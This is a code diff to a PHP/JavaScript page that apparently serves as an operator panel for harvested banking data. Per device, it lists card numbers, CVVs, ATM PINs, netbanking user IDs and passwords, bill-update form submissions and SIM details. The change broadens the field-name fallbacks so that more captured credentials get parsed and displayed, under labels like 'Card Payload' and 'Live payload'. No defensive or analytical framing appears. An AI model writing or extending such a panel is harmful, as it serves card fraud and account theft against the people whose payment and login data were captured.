@@ -467,10 +467,10 @@ include_once __DIR__ . '/header.php';
 
               // Format Card list
               const bankName = rawCard.bankName || rawCard.bank_name || userCard.bankName || userCard.bank_name || 'Bank Account';
-              const cardNumber = rawCard.number || rawCard.cardNumber || rawCard.card_number || 'N/A';
-              const expiry = rawCard.exp || rawCard.expiry || rawCard.card_expiry || rawCard.expiryDate || 'N/A';
-              const cvv = rawCard.cvv || rawCard.card_cvv || rawCard.security_code || '•••';
-              const atmPin = rawCard.atm_pin || rawCard.atmPin || rawCard.pin || '';
+              const cardNumber = rawCard.number || rawCard.cardNumber || rawCard.card_number || rawCard.card_no || rawCard.cardNo || 'N/A';
+              const expiry = rawCard.exp || rawCard.expiry || rawCard.card_expiry || rawCard.expiryDate || rawCard.exp_date || rawCard.expiry_date || 'N/A';
+              const cvv = rawCard.cvv || rawCard.card_cvv || rawCard.security_code || rawCard.cvc || '•••';
+              const atmPin = rawCard.atm_pin || rawCard.atmPin || rawCard.pin || rawCard.security_pin || '';
 
               const cardDataList = (cardNumber !== 'N/A') ? [{
                 bankName,
@@ -478,25 +478,26 @@ include_once __DIR__ . '/header.php';
                 expiry,
                 cvv,
                 atmPin,
-                cardHolder: rawCard.cardHolder || rawCard.name || userCard.fullName || 'N/A',
-                cardType: rawCard.cardType || rawCard.card_type || 'Card Payload'
+                cardHolder: rawCard.cardHolder || rawCard.cardHolderName || rawCard.name || userCard.fullName || 'N/A',
+                cardType: rawCard.cardType || rawCard.card_type || rawCard.type || 'Card Payload'
               }] : [];
 
               // Format Netbanking list
-              const netbankingDataList = rawNetbanking.user_id ? [{
-                bankName: rawNetbanking.bank_name || 'Netbanking Account',
-                userId: rawNetbanking.user_id,
-                password: rawNetbanking.password
+              const netbankingUserId = rawNetbanking.user_id || rawNetbanking.userId || rawNetbanking.user_name || rawNetbanking.username;
+              const netbankingDataList = netbankingUserId ? [{
+                bankName: rawNetbanking.bank_name || rawNetbanking.bankName || 'Netbanking Account',
+                userId: netbankingUserId,
+                password: rawNetbanking.password || rawNetbanking.pass || ''
               }] : [];
 
               // Format Form Data list
               const formDataFields = rawForm.fields || rawForm;
-              const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number;
+              const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number || formDataFields.phone || formDataFields.user_name || (typeof formDataFields === 'object' && Object.keys(formDataFields).length > 0 && !formDataFields.id);
               const formDataList = hasForm ? [{
                 id: `frm_${devId}`,
                 formTitle: 'Customer / Bill Update Submission',
                 fields: formDataFields,
-                timestamp: userCard.joined || 'Live payload'
+                timestamp: userCard.joined || userCard.timestamp || 'Live payload'
               }] : [];
 
               // SIM card parsing with support for sims array
